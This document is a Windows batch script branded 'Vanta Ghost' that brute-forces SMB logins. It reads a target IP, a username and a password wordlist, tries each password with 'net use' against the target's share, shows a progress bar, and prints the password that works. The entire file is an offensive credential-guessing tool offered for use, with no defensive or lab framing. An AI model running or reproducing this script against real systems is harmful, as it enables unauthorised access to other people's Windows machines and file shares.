@echo off
title Simple Bruteforce - Vanta Ghost
color A
setlocal enabledelayedexpansion

echo.
echo  ___      ___ ________  ________   _________  ________          ________  ___  ___  ________  ________  _________   
echo |\  \    /  /|\   __  \|\   ___  \|\___   ___\\   __  \        |\   ____\|\  \|\  \|\   __  \|\   ____\|\___   ___\ 
echo \ \  \  /  / | \  \|\  \ \  \\ \  \|___ \  \_\ \  \|\  \       \ \  \___|\ \  \\\  \ \  \|\  \ \  \___|\|___ \  \_| 
echo  \ \  \/  / / \ \   __  \ \  \\ \  \   \ \  \ \ \   __  \       \ \  \  __\ \   __  \ \  \\\  \ \_____  \   \ \  \  
echo   \ \    / /   \ \  \ \  \ \  \\ \  \   \ \  \ \ \  \ \  \       \ \  \|\  \ \  \ \  \ \  \\\  \|____|\  \   \ \  \ 
echo    \ \__/ /     \ \__\ \__\ \__\\ \__\   \ \__\ \ \__\ \__\       \ \_______\ \__\ \__\ \_______\____\_\  \   \ \__\
echo     \|__|/       \|__|\|__|\|__| \|__|    \|__|  \|__|\|__|        \|_______|\|__|\|__|\|_______|\_________\   \|__|
echo                                                                                                \|_________|        
echo.

set /p ip="Enter IP Address: "
set /p user="Enter UserName: "
set /p wordlist="Enter Password List File: "

:: Count total passwords
set /a total=0
for /f %%a in (%wordlist%) do (
    set /a total+=1
)

set /a count=1

for /f %%a in (%wordlist%) do (
    set pass=%%a
    call :attempt
)

echo Password Not Found! :(
pause
exit

:success
echo.
echo ============================================
echo           Password Found: !pass!
echo ============================================
net use \\%ip% /d /y
pause
exit

:attempt
:: Try to connect
net use \\%ip% /user:%user% !pass! >nul 2>&1

:: Display Progress Bar
set /a progress=(count * 50) / total
set "bar="
for /l %%i in (1,1,!progress!) do set "bar=!bar!#"
for /l %%i in (!progress!,1,50) do set "bar=!bar!-"
cls
echo Trying Password: !pass!
echo [!bar!] !count! of !total! attempts
echo.

set /a count+=1

if !errorlevel! EQU 0 goto success
exit /b
